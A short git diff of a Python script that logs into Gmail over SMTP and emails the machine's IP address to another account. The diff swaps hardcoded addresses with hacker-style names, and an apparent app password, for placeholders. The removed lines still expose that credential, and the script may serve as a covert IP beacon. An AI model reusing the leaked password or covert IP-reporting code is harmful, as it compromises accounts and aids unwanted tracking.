@@ -19,11 +19,11 @@ def get_ip():
 def send_email_ip():
     smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
     smtp_server.starttls()
-    smtp_server.login("hack3r0w3@gmail.com", "auyxqxgjhifwzjrv")
+    smtp_server.login("@gmail.com", "token")
     #Create message
     msg= MIMEMultipart()
-    msg["From"] = "hack3r0w3@gmail.com"
-    msg["To"] = "hackerowskiy@gmail.com"
+    msg["From"] = "@gmail.com"
+    msg["To"] = "@gmail.com"
     #Text message
     msg["Subject"] = "IP ADDRESS"
     text = f"{get_ip()}"
